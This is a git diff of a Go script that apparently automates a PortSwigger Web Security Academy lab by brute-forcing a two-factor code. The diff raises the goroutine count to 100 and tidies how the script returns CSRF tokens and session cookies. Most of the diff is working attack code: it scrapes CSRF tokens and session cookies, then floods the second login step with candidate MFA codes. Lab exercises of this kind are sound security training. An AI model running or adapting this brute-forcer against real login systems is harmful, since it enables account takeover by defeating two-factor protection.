@@ -11,10 +11,10 @@ import (
 )
 
 // Change host to your own lab
-var host string = "https://0a4b00310368310881b402f400840078.web-security-academy.net"
+var host string = "https://0aae002e04be0ff5816cb29d0002005c.web-security-academy.net"
 
 // Change threads to the number of threads you want to run in goroutines
-var threads int = 40
+var threads int = 100
 
 var csrfGrep string = `<input required type="hidden" name="csrf" value="([^"]+)"`
 var complete bool = false
@@ -98,20 +98,18 @@ func getLogin() (sessionCookie string, csrf string, err error) {
 
 	// Extracting the session cookie from response
 	sessionCookie = resp.Header.Get("Set-Cookie")[:40]
-	fmt.Println("session cookie found (GET /LOGIN):", sessionCookie)
 
 	// Extracting the CSRF token from response body
 	re := regexp.MustCompile(csrfGrep)
 	match := re.FindStringSubmatch(string(body))
 	if len(match) > 0 {
 		csrfGrep := match[1]
-		fmt.Println("csrf token found:", csrfGrep)
+		// Returns the csrf, the session cookie, and the error(a null value)
+		return sessionCookie, csrfGrep, nil
 	} else {
 		fmt.Println("csrf token not found")
+		return "", "", nil
 	}
-
-	// Returns the csrf, the session cookie, and the error(a null value)
-	return sessionCookie, csrfGrep, nil
 }
 
 func postLogin(cookie string, csrf string) (followCookie string, err error) {
@@ -136,7 +134,6 @@ func postLogin(cookie string, csrf string) (followCookie string, err error) {
 
 	// Extracting the session cookie from response
 	sessionCookie := resp.Header.Get("Set-Cookie")[:40]
-	fmt.Println("session cookie found (POST /LOGIN):", sessionCookie)
 
 	// Returns the session cookie
 	return sessionCookie, nil
@@ -170,13 +167,12 @@ func getLogin2(cookie string) (csrf string, err error) {
 	match := re.FindStringSubmatch(string(body))
 	if len(match) > 0 {
 		csrfGrep := match[1]
-		fmt.Println("csrf token found:", csrfGrep)
+		// Returns the csrf
+		return csrfGrep, nil
 	} else {
 		fmt.Println("csrf token not found")
+		return "", nil
 	}
-
-	// Returns the csrf
-	return csrfGrep, nil
 }
 
 func postLogin2(cookie string, csrf string, mfa string) (correctCookie string, err error) {
@@ -201,13 +197,12 @@ func postLogin2(cookie string, csrf string, mfa string) (correctCookie string, e
 
 	// Checking the status code, if not 302 gave a feedback on terminal and return empty
 	if resp.StatusCode != 302 {
-		fmt.Printf("code: %s -> status %d", mfa, resp.StatusCode)
+		fmt.Printf("code: %s -> status %d\n", mfa, resp.StatusCode)
 		return "", nil
 	}
 
 	// Extracting the session cookie from response
 	sessionCookie := resp.Header.Get("Set-Cookie")[:40]
-	fmt.Println("session cookie found (POST /LOGIN):", sessionCookie)
 
 	// Returns the session cookie
 	return sessionCookie, nil
